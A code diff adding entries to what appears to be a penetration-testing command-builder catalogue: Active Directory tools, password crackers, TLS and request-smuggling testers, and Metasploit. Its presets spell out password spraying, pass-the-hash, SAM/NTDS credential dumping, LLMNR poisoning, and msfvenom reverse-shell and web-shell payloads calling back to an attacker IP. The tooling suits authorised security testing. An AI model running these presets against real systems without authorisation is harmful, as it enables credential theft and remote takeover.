@@ -3270,9 +3270,426 @@ _CRYPTO = [
 ]  # end _CRYPTO
 
 
+_AD_C  = "#06b6d4"   # Active Directory (cyan)
+_EXC   = "#ef4444"   # Exploitation (red)
+_CREDC = "#f97316"   # Credentials (matches existing)
+_VULNC = "#ff6b2b"   # Vulnerability (matches existing)
+
+
+# ── Active Directory (9) ──────────────────────────────────────────────────────
+
+_AD = [
+
+    {"slug":"bloodhound-py","name":"bloodhound-python","full_name":"BloodHound.py",
+     "desc":"BloodHound data collector — enumerate AD objects, ACLs, sessions, and trust relationships.",
+     "category":"Active Directory","tier":2,"icon":"🩸","color":_AD_C,
+     "sections":[
+       S("tgt","Target Domain","🎯",
+         F("d","-d","Domain (-d) *","Active Directory domain","corp.local"),
+         F("ns","-ns","Nameserver (-ns) *","Domain controller IP","10.10.10.1"),
+         F("dc","--dc","DC hostname (--dc)","FQDN of DC","DC01.corp.local"),
+       ),
+       S("auth","Authentication","🔑",
+         F("u","-u","Username (-u)","Domain user","jsmith"),
+         F("p","-p","Password (-p)","Password","Password123"),
+         F("hashes","--hashes","Hashes (--hashes)","LM:NTLM for PTH","aad3b435:5f4dcc3b"),
+       ),
+       S("opts","Collection","🔧",
+         Sel("c","-c","Method (-c)","Collection method",_opts(("All","All"),("DCOnly","DCOnly"),("Session","Session"),("LoggedOn","LoggedOn"),("Group","Group"),("ACL","ACL"),("Trusts","Trusts"))),
+         F("w","-w","Workers (-w)","Concurrent workers","10","number"),
+         T("--zip","Compress output to zip"),
+       ),
+     ],
+     "presets":[
+       P("Full collection",{"d":"corp.local","ns":"10.10.10.1","u":"jsmith","p":"Password123","c":"All","zip":True}),
+       P("DC only (fast)",{"d":"corp.local","ns":"10.10.10.1","u":"jsmith","p":"Password123","c":"DCOnly"}),
+       P("Session enum",{"d":"corp.local","ns":"10.10.10.1","u":"jsmith","p":"Password123","c":"Session"}),
+     ]},
+
+    {"slug":"netexec","name":"nxc","full_name":"NetExec (nxc)",
+     "desc":"Swiss army knife for Windows/AD — auth testing, enumeration, lateral movement over SMB, WinRM, LDAP, MSSQL, RDP.",
+     "category":"Active Directory","tier":2,"icon":"🕸","color":_AD_C,
+     "sections":[
+       S("tgt","Target","🎯",
+         Sel("proto","","Protocol *","Service protocol",_opts(("smb","smb"),("winrm","winrm"),("ldap","ldap"),("mssql","mssql"),("rdp","rdp"),("ssh","ssh"),("ftp","ftp"))),
+         Tgt("10.10.10.1  or  192.168.1.0/24  or  targets.txt","Target IP, CIDR, or file"),
+       ),
+       S("auth","Authentication","🔑",
+         F("u","-u","Username (-u)","Username or file","administrator"),
+         F("p","-p","Password (-p)","Password or file","Password123"),
+         F("H","-H","Hash (-H)","NTLM hash for PTH","aad3b435:8846f7ea"),
+         F("d","-d","Domain (-d)","Domain name","corp.local"),
+         T("--no-bruteforce","Pair each user with each password (not product)"),
+         T("--local-auth","Authenticate with local account"),
+       ),
+       S("actions","Actions","⚡",
+         T("--shares","Enumerate accessible shares"),
+         T("--users","Enumerate domain users"),
+         T("--groups","Enumerate domain groups"),
+         T("--pass-pol","Dump password policy"),
+         T("--sam","Dump SAM hashes (admin required)"),
+         T("--lsa","Dump LSA secrets (admin required)"),
+         F("x","-x","Execute cmd (-x)","Run cmd.exe command","whoami /all"),
+         F("X","-X","Execute PS (-X)","Run PowerShell command","Get-Process"),
+       ),
+     ],
+     "presets":[
+       P("SMB auth check",{"proto":"smb","u":"administrator","p":"Password123"}),
+       P("Password spray",{"proto":"smb","u":"users.txt","p":"Password123","no_bruteforce":True}),
+       P("Pass-the-hash",{"proto":"smb","u":"administrator","H":"aad3b435:NTLMHASH","shares":True}),
+       P("WinRM shell",{"proto":"winrm","u":"administrator","p":"Password123"}),
+       P("Enumerate users",{"proto":"ldap","u":"jsmith","p":"Password123","users":True}),
+     ]},
+
+    {"slug":"evil-winrm","name":"evil-winrm","full_name":"evil-winrm",
+     "desc":"WinRM shell for pentesting — upload/download files, run PS scripts, pass-the-hash.",
+     "category":"Active Directory","tier":2,"icon":"😈","color":_AD_C,
+     "sections":[
+       S("tgt","Target","🎯",
+         F("i","-i","IP (-i) *","Target IP or hostname","10.10.10.1"),
+         F("P","-P","Port (-P)","WinRM port (default 5985)","5985","number"),
+         T("-S","Use SSL / port 5986"),
+       ),
+       S("auth","Authentication","🔑",
+         F("u","-u","Username (-u)","Username","administrator"),
+         F("p","-p","Password (-p)","Password","Password123"),
+         F("H","-H","Hash (-H)","NTLM hash for PTH","aad3b435:8846f7ea"),
+       ),
+       S("opts","Options","🔧",
+         F("s","-s","Scripts (-s)","Path to PS scripts dir","./ps_scripts"),
+         F("e","-e","Executables (-e)","Path to executables dir","./exe"),
+       ),
+     ],
+     "presets":[
+       P("Password login",{"i":"10.10.10.1","u":"administrator","p":"Password123"}),
+       P("Pass-the-hash",{"i":"10.10.10.1","u":"administrator","H":"NTLMHASH"}),
+       P("SSL WinRM",{"i":"10.10.10.1","u":"administrator","p":"Password123","S":True,"P":"5986"}),
+     ]},
+
+    {"slug":"secretsdump","name":"secretsdump.py","full_name":"impacket-secretsdump",
+     "desc":"Dump NTLM hashes from SAM, LSA secrets, and NTDS.dit — local or remote, PTH supported.",
+     "category":"Active Directory","tier":2,"icon":"🗝","color":_AD_C,
+     "sections":[
+       S("tgt","Target","🎯",
+         F("target","","Target *","DOMAIN/user:pass@IP  or  user:pass@IP","corp.local/administrator:Password123@10.10.10.1"),
+       ),
+       S("auth","Auth Options","🔑",
+         F("hashes","-hashes","Hashes (-hashes)","LM:NTLM for PTH","aad3b435:8846f7ea"),
+       ),
+       S("opts","Options","🔧",
+         T("-just-dc","Only dump from NTDS.dit (DC only)"),
+         T("-just-dc-ntlm","NTLM hashes only from NTDS"),
+         F("outputfile","-outputfile","Output prefix (-outputfile)","Save hashes to file","dump"),
+       ),
+     ],
+     "presets":[
+       P("Dump SAM (remote)",{"target":"DOMAIN/administrator:Password123@TARGET"}),
+       P("PTH SAM dump",{"target":"DOMAIN/administrator@TARGET","hashes":"aad3b435:NTLMHASH"}),
+       P("NTDS dump (DC)",{"target":"DOMAIN/administrator:Password123@DC","just_dc":True,"outputfile":"ntds"}),
+     ]},
+
+    {"slug":"getuserspns","name":"GetUserSPNs.py","full_name":"impacket-GetUserSPNs",
+     "desc":"Kerberoasting — request TGS tickets for SPN accounts and output ready for hashcat (mode 13100).",
+     "category":"Active Directory","tier":2,"icon":"🎫","color":_AD_C,
+     "sections":[
+       S("tgt","Target","🎯",
+         F("target","","Target *","DOMAIN/user:pass","corp.local/jsmith:Password123"),
+         F("dc_ip","-dc-ip","DC IP (-dc-ip) *","Domain controller IP","10.10.10.1"),
+       ),
+       S("auth","Auth Options","🔑",
+         F("hashes","-hashes","Hashes (-hashes)","LM:NTLM for PTH","aad3b435:8846f7ea"),
+       ),
+       S("opts","Options","🔧",
+         T("-request","Request TGS tickets (required for cracking)"),
+         F("outputfile","-outputfile","Output file","Save hashes here","kerberoast.txt"),
+         Sel("format","-format","Format","Output format",_opts(("hashcat","hashcat"),("john","john"))),
+       ),
+     ],
+     "presets":[
+       P("List SPNs only",{"target":"corp.local/jsmith:Password123","dc_ip":"10.10.10.1"}),
+       P("Kerberoast → hashcat",{"target":"corp.local/jsmith:Password123","dc_ip":"10.10.10.1","request":True,"format":"hashcat","outputfile":"kerberoast.txt"}),
+     ]},
+
+    {"slug":"psexec-py","name":"psexec.py","full_name":"impacket-psexec",
+     "desc":"Remote execution via SMB — spawns a SYSTEM shell or executes commands on a remote Windows host.",
+     "category":"Active Directory","tier":2,"icon":"💻","color":_AD_C,
+     "sections":[
+       S("tgt","Target","🎯",
+         F("target","","Target *","DOMAIN/user:pass@IP","corp.local/administrator:Password123@10.10.10.1"),
+       ),
+       S("auth","Auth Options","🔑",
+         F("hashes","-hashes","Hashes (-hashes)","LM:NTLM for PTH","aad3b435:8846f7ea"),
+       ),
+       S("opts","Options","🔧",
+         F("port","-port","Port (-port)","SMB port","445","number"),
+       ),
+     ],
+     "presets":[
+       P("Get SYSTEM shell",{"target":"corp.local/administrator:Password123@TARGET"}),
+       P("Pass-the-hash",{"target":"corp.local/administrator@TARGET","hashes":"aad3b435:NTLMHASH"}),
+     ]},
+
+    {"slug":"kerbrute","name":"kerbrute","full_name":"Kerbrute",
+     "desc":"Fast Kerberos user enumeration and password spraying — avoids account lockout by design.",
+     "category":"Active Directory","tier":2,"icon":"🔑","color":_AD_C,
+     "sections":[
+       S("cmd","Mode","⚡",
+         Sel("mode","","Mode *","Operation",_opts(("userenum","userenum"),("passwordspray","passwordspray"),("bruteuser","bruteuser"),("bruteforce","bruteforce"))),
+       ),
+       S("tgt","Target","🎯",
+         F("dc","--dc","Domain Controller (--dc) *","DC IP or hostname","10.10.10.1"),
+         F("d","-d","Domain (-d) *","Domain name","corp.local"),
+         Tgt("userlist.txt","Username list (for userenum) or password (for spray)"),
+       ),
+       S("opts","Options","🔧",
+         F("password","--password","Password (spray)","Password to spray","Password123"),
+         F("t","--threads","Threads (--threads)","Concurrent threads","10","number"),
+         F("o","--output","Output file (--output)","Save valid accounts","valid_users.txt"),
+         T("--safe","Exit if account lockout threshold detected"),
+         T("--downgrade","Force RC4 downgrade"),
+       ),
+     ],
+     "presets":[
+       P("Enumerate valid users",{"mode":"userenum","dc":"10.10.10.1","d":"corp.local","o":"valid_users.txt"}),
+       P("Password spray",{"mode":"passwordspray","dc":"10.10.10.1","d":"corp.local","password":"Password123","safe":True}),
+     ]},
+
+    {"slug":"responder","name":"responder","full_name":"Responder",
+     "desc":"LLMNR / NBT-NS / mDNS poisoner — capture NTLMv2 hashes from the local network segment.",
+     "category":"Active Directory","tier":2,"icon":"📡","color":_AD_C,
+     "sections":[
+       S("tgt","Interface","🎯",
+         F("I","-I","Interface (-I) *","Network interface","eth0"),
+       ),
+       S("opts","Options","🔧",
+         T("-v","Verbose — print all captured hashes"),
+         T("-A","Analyze mode — listen only, no poisoning"),
+         T("-w","Start WPAD rogue proxy"),
+         T("-F","Force NTLM auth on WPAD"),
+         T("-P","Use ProxyAuth instead of WPADAuth"),
+         T("--lm","Force LM hash downgrade"),
+       ),
+     ],
+     "presets":[
+       P("Poison & capture",{"I":"eth0","v":True}),
+       P("Analyze mode",{"I":"eth0","A":True,"v":True}),
+       P("With WPAD proxy",{"I":"eth0","w":True,"F":True,"v":True}),
+     ]},
+
+    {"slug":"enum4linux-ng","name":"enum4linux-ng","full_name":"enum4linux-ng",
+     "desc":"SMB/RPC enumeration — users, groups, shares, OS info, and password policy via null/auth sessions.",
+     "category":"Active Directory","tier":2,"icon":"🔭","color":_AD_C,
+     "sections":[
+       S("tgt","Target","🎯",
+         Tgt("10.10.10.1","Target IP"),
+       ),
+       S("auth","Authentication","🔑",
+         F("u","-u","Username (-u)","Leave blank for null session",""),
+         F("p","-p","Password (-p)","Password",""),
+         F("w","-w","Workgroup (-w)","Windows workgroup","WORKGROUP"),
+       ),
+       S("opts","Options","🔧",
+         T("-A","All checks (recommended)"),
+         T("-U","Enumerate users"),
+         T("-S","Enumerate shares"),
+         T("-G","Enumerate groups"),
+         T("-P","Dump password policy"),
+         T("-O","OS information"),
+         T("-oJ","JSON output"),
+         T("-oY","YAML output"),
+       ),
+     ],
+     "presets":[
+       P("Full enum (null session)",{"A":True}),
+       P("Full enum (authenticated)",{"A":True,"u":"jsmith","p":"Password123"}),
+       P("Shares only",{"S":True}),
+       P("Full + JSON output",{"A":True,"oJ":True}),
+     ]},
+
+]  # end _AD
+
+
+# ── Credentials expansion (2) ─────────────────────────────────────────────────
+
+_CRED_NEW = [
+
+    {"slug":"john","name":"john","full_name":"John the Ripper",
+     "desc":"Classic CPU password cracker — auto-detects hash type, supports 100+ formats.",
+     "category":"Credentials","tier":2,"icon":"🔓","color":_CREDC,
+     "sections":[
+       S("tgt","Hash File","🎯",
+         Tgt("hash.txt  or  /etc/shadow","File containing hashes to crack"),
+       ),
+       S("opts","Options","🔧",
+         F("format","--format","Format (--format)","Hash format (auto-detected if omitted)","NT"),
+         F("wordlist","--wordlist","Wordlist (--wordlist)","Wordlist path","rockyou.txt"),
+         F("rules","--rules","Rules (--rules)","Rules set name","Jumbo"),
+         F("session","--session","Session (--session)","Session name for resuming","crack1"),
+         T("--show","Show cracked passwords from potfile"),
+         T("--fork=4","Fork 4 processes (parallelism)"),
+         F("pot","--pot","Pot file (--pot)","Custom potfile path","john.pot"),
+       ),
+     ],
+     "presets":[
+       P("Auto-detect & crack",{"wordlist":"rockyou.txt"}),
+       P("Crack NTLM",{"format":"NT","wordlist":"rockyou.txt","rules":"Jumbo"}),
+       P("Crack /etc/shadow",{"format":"sha512crypt","wordlist":"rockyou.txt"}),
+       P("Crack Kerberoast",{"format":"krb5tgs","wordlist":"rockyou.txt"}),
+       P("Show cracked",{"show":True}),
+     ]},
+
+]  # end _CRED_NEW
+
+
+# ── Vulnerability expansion (5) ───────────────────────────────────────────────
+
+_VULN_NEW = [
+
+    {"slug":"testssl","name":"testssl.sh","full_name":"testssl.sh",
+     "desc":"TLS/SSL testing — cipher support, protocol versions, certificate info, and known vulnerabilities.",
+     "category":"Vulnerability","tier":2,"icon":"🔒","color":_VULNC,
+     "sections":[
+       S("tgt","Target","🎯",
+         Tgt("target.com:443  or  https://target.com","Hostname:port or URL"),
+       ),
+       S("opts","Checks","🔧",
+         T("-e","Test all local ciphers"),
+         T("-E","Test all ciphers with each protocol"),
+         T("-U","Test known vulnerabilities (Heartbleed, POODLE, ROBOT…)"),
+         T("-p","Test TLS/SSL protocols"),
+         T("-h","Test HTTP headers"),
+         T("-c","Certificate info"),
+         T("-S","Server defaults and preferences"),
+         T("--fast","Omit some time-consuming checks"),
+       ),
+       S("output","Output","📄",
+         F("json","--jsonfile","JSON output (--jsonfile)","Save as JSON","testssl.json"),
+         F("csv","--csvfile","CSV output (--csvfile)","Save as CSV","testssl.csv"),
+         T("--quiet","Suppress non-issue output"),
+       ),
+     ],
+     "presets":[
+       P("Full TLS audit",{"U":True,"p":True,"c":True,"S":True,"h":True}),
+       P("Vulnerabilities only",{"U":True}),
+       P("Cipher list",{"e":True}),
+       P("Full + JSON",{"U":True,"p":True,"c":True,"json":"testssl.json"}),
+     ]},
+
+    {"slug":"smuggler","name":"smuggler.py","full_name":"Smuggler",
+     "desc":"HTTP request smuggling detection — test for CL.TE, TE.CL, and TE.TE desync vulnerabilities.",
+     "category":"Vulnerability","tier":3,"icon":"🤫","color":_VULNC,
+     "sections":[
+       S("tgt","Target","🎯",
+         F("u","-u","URL (-u) *","Target URL","https://target.com/"),
+       ),
+       S("opts","Options","🔧",
+         Sel("verb","--verb","HTTP Verb (--verb)","HTTP method",_opts(("POST","POST"),("GET","GET"),("PUT","PUT"))),
+         Sel("level","-l","Level (-l)","Test thoroughness",_opts(("1 (quick)","1"),("2 (normal)","2"),("3 (thorough)","3"))),
+         F("log","--log","Log file (--log)","Save output","smuggler.log"),
+         F("timeout","--timeout","Timeout (--timeout)","Request timeout seconds","5","number"),
+         T("-q","Quiet — suppress non-finding output"),
+       ),
+     ],
+     "presets":[
+       P("Quick test",{"u":"https://TARGET/","level":"1","q":True}),
+       P("Full test",{"u":"https://TARGET/","level":"3"}),
+       P("Full + save log",{"u":"https://TARGET/","level":"3","log":"smuggler.log"}),
+     ]},
+
+]  # end _VULN_NEW
+
+
+# ── Exploitation (3) ──────────────────────────────────────────────────────────
+
+_EXPLOIT = [
+
+    {"slug":"searchsploit","name":"searchsploit","full_name":"SearchSploit",
+     "desc":"Offline Exploit-DB search — find exploits by product name, CVE, or platform.",
+     "category":"Exploitation","tier":2,"icon":"💣","color":_EXC,
+     "sections":[
+       S("tgt","Search","🎯",
+         Tgt("vsftpd 2.3.4  or  CVE-2017-0144  or  smb","Search term(s) — product name, version, CVE"),
+       ),
+       S("opts","Options","🔧",
+         T("-t","Search title only (not file path)"),
+         T("-e","Exact term match"),
+         T("--id","Show Exploit-DB ID numbers only"),
+         T("-w","Show web link to exploit"),
+         T("-p","Show full path of exploit file"),
+         F("m","-m","Copy to CWD (-m)","Mirror exploit ID to current dir","44555"),
+         F("x","-x","Examine (-x)","View exploit source","44555"),
+         T("--nmap","Search from nmap XML output (pipe nmap -sV)"),
+       ),
+     ],
+     "presets":[
+       P("Search product",{}),
+       P("Search by CVE",{"t":True}),
+       P("Show with web links",{"w":True}),
+       P("Copy exploit to CWD",{"m":"EXPLOIT_ID"}),
+     ]},
+
+    {"slug":"msfconsole","name":"msfconsole","full_name":"Metasploit Console",
+     "desc":"Metasploit Framework console — search modules, configure exploits, run payloads.",
+     "category":"Exploitation","tier":2,"icon":"🎯","color":_EXC,
+     "sections":[
+       S("opts","Options","⚡",
+         T("-q","Quiet — suppress banner"),
+         F("x","-x","Execute commands (-x)","Semicolon-separated MSF commands to run","use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.1; set LPORT 4444; run"),
+         F("r","-r","Resource script (-r)","Path to .rc resource file","setup.rc"),
+         F("n","-n","Module name (--module-path)","Custom module path","./modules"),
+       ),
+     ],
+     "presets":[
+       P("Interactive console",{"q":True}),
+       P("Run exploit one-liner",{"q":True,"x":"use MODULE; set RHOSTS TARGET; set LHOST 10.10.14.1; set LPORT 4444; run"}),
+       P("Multi/handler listener",{"q":True,"x":"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.1; set LPORT 4444; run"}),
+       P("Run resource script",{"q":True,"r":"setup.rc"}),
+     ]},
+
+    {"slug":"msfvenom","name":"msfvenom","full_name":"msfvenom",
+     "desc":"Metasploit payload generator — create shellcode, executables, scripts for any platform.",
+     "category":"Exploitation","tier":2,"icon":"🧬","color":_EXC,
+     "sections":[
+       S("payload","Payload","🎯",
+         F("p","-p","Payload (-p) *","Payload module path","windows/x64/meterpreter/reverse_tcp"),
+         T("-l payloads","List all available payloads"),
+         F("LHOST","LHOST=","LHOST","Attacker IP for callback","10.10.14.1"),
+         F("LPORT","LPORT=","LPORT","Attacker port for callback","4444"),
+       ),
+       S("encode","Encoding","🔀",
+         F("e","-e","Encoder (-e)","Encoder module","x86/shikata_ga_nai"),
+         F("i","-i","Iterations (-i)","Encoding iterations","3","number"),
+         F("b","-b","Bad chars (-b)","Null bytes to avoid","\\x00\\x0a\\x0d"),
+       ),
+       S("fmt","Format","📦",
+         Sel("f","-f","Format (-f) *","Output format",_opts(("exe","exe"),("elf","elf"),("raw","raw"),("c","c"),("python","python"),("ps1","ps1"),("asp","asp"),("aspx","aspx"),("war","war"),("jar","jar"),("dll","dll"),("macho","macho"))),
+         F("o","-o","Output file (-o)","Save payload","payload.exe"),
+         F("s","-s","Max size (-s)","Max bytes in payload",""),
+         F("a","-a","Architecture (-a)","Target arch: x86, x64","x64"),
+         Sel("platform","--platform","Platform","Target OS",_opts(("windows","windows"),("linux","linux"),("osx","osx"),("android","android"),("java","java"))),
+       ),
+     ],
+     "presets":[
+       P("Win x64 TCP",{"p":"windows/x64/meterpreter/reverse_tcp","LHOST":"10.10.14.1","LPORT":"4444","f":"exe","o":"shell.exe"}),
+       P("Linux ELF",{"p":"linux/x64/meterpreter/reverse_tcp","LHOST":"10.10.14.1","LPORT":"4444","f":"elf","o":"shell"}),
+       P("PowerShell",{"p":"windows/x64/meterpreter/reverse_tcp","LHOST":"10.10.14.1","LPORT":"4444","f":"ps1","o":"shell.ps1"}),
+       P("Web shell ASPX",{"p":"windows/meterpreter/reverse_tcp","LHOST":"10.10.14.1","LPORT":"4444","f":"aspx","o":"shell.aspx"}),
+       P("PHP webshell",{"p":"php/meterpreter/reverse_tcp","LHOST":"10.10.14.1","LPORT":"4444","f":"php","o":"shell.php"}),
+     ]},
+
+]  # end _EXPLOIT
+
+
 # ── Combine all tools ─────────────────────────────────────────────────────────
 
-TOOLS = _T1 + _T2 + _T3 + _UNIX + _CLOUD_NEW + _FORENSICS + _RE + _CRYPTO
+_raw = _T1 + _T2 + _T3 + _UNIX + _CLOUD_NEW + _FORENSICS + _RE + _CRYPTO + _AD + _CRED_NEW + _VULN_NEW + _EXPLOIT
+# Deduplicate: later definitions (new categories) override earlier ones by slug
+_seen: set = set()
+TOOLS = []
+for _t in reversed(_raw):
+    if _t["slug"] not in _seen:
+        _seen.add(_t["slug"])
+        TOOLS.insert(0, _t)
 
 # Lookup by slug
 TOOLS_BY_SLUG = {t["slug"]: t for t in TOOLS}
@@ -3828,6 +4245,33 @@ INSTALL_MAP = {
     "uniq":     {"builtin": _B},
     "wc":       {"builtin": _B},
     "tr":       {"builtin": _B},
+
+    # ── Active Directory ──────────────────────────────────────────────────────
+    "bloodhound-py":  {"pip": "pip install bloodhound", "apt": "sudo apt install -y bloodhound.py"},
+    "netexec":        {"pip": "pip install netexec", "apt": "sudo apt install -y netexec"},
+    "evil-winrm":     {"gem": "gem install evil-winrm", "apt": "sudo apt install -y evil-winrm"},
+    "secretsdump":    {"pip": "pip install impacket", "apt": "sudo apt install -y impacket-scripts"},
+    "getuserspns":    {"pip": "pip install impacket", "apt": "sudo apt install -y impacket-scripts"},
+    "psexec-py":      {"pip": "pip install impacket", "apt": "sudo apt install -y impacket-scripts"},
+    "kerbrute":       {"brew": "brew install kerbrute", "go": "go install github.com/ropnop/kerbrute@latest"},
+    "responder":      {"apt": "sudo apt install -y responder", "pip": "pip install git+https://github.com/lgandx/Responder"},
+    "enum4linux-ng":  {"pip": "pip install enum4linux-ng", "apt": "sudo apt install -y enum4linux-ng"},
+
+    # ── Credentials (new) ─────────────────────────────────────────────────────
+    "hashcat":        {"brew": "brew install hashcat", "apt": "sudo apt install -y hashcat"},
+    "john":           {"brew": "brew install john-jumbo", "apt": "sudo apt install -y john"},
+
+    # ── Vulnerability (new) ───────────────────────────────────────────────────
+    "sqlmap":         {"brew": "brew install sqlmap", "apt": "sudo apt install -y sqlmap", "pip": "pip install sqlmap"},
+    "dalfox":         {"brew": "brew install hahwul/tap/dalfox", "go": "go install github.com/hahwul/dalfox/v2@latest"},
+    "arjun":          {"pip": "pip install arjun"},
+    "testssl":        {"brew": "brew install testssl", "apt": "sudo apt install -y testssl.sh"},
+    "smuggler":       {"pip": "pip install git+https://github.com/defparam/smuggler"},
+
+    # ── Exploitation ─────────────────────────────────────────────────────────
+    "searchsploit":   {"apt": "sudo apt install -y exploitdb", "brew": "brew install exploitdb"},
+    "msfconsole":     {"brew": "brew install metasploit", "apt": "sudo apt install -y metasploit-framework"},
+    "msfvenom":       {"brew": "brew install metasploit", "apt": "sudo apt install -y metasploit-framework"},
 }
 
 # Display labels and icons for each install method
